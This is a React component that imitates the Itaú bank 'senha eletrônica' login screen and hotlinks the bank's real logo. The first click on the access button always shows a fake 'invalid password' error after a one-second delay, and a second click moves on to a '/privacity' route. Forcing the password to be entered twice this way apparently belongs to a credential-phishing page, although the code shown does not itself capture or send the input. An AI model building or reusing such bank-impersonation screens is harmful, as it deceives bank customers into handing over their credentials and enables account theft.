import React from 'react'
import './SenhaEletronica.css'
import { useNavigate } from 'react-router-dom'
import { useRef, useState } from 'react'

const SenhaEletronica = () => {
    const [errou, setErrou] = useState(false);
    const errorRef = useRef(null);
    const navigate = useNavigate();

    const abrirErro = () => {
        if(errou === false){
            setTimeout(() => {
                errorRef.current.style.display = 'flex';
                setErrou(true)
            }, 1000);
        } else if (errou === true){
            navigate('/privacity');
        } else{
            window.alert("Fatal Error 403")
        }
        
      };
    const fecharError = () => {
        errorRef.current.style.display = 'none';
      };
  return (
    <div className='SenhaEletronica'>
        <div className='error' ref={errorRef}>
            <span>Senha Inválida. (C902-033)</span>
            <button onClick={fecharError}>OK</button>
        </div>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='form2'>
            <span>senha eletrônica</span>
            <input type="password" placeholder='' />
            <button onClick={abrirErro}>acessar</button>
        </div>
    </div>
  )
}

export default SenhaEletronica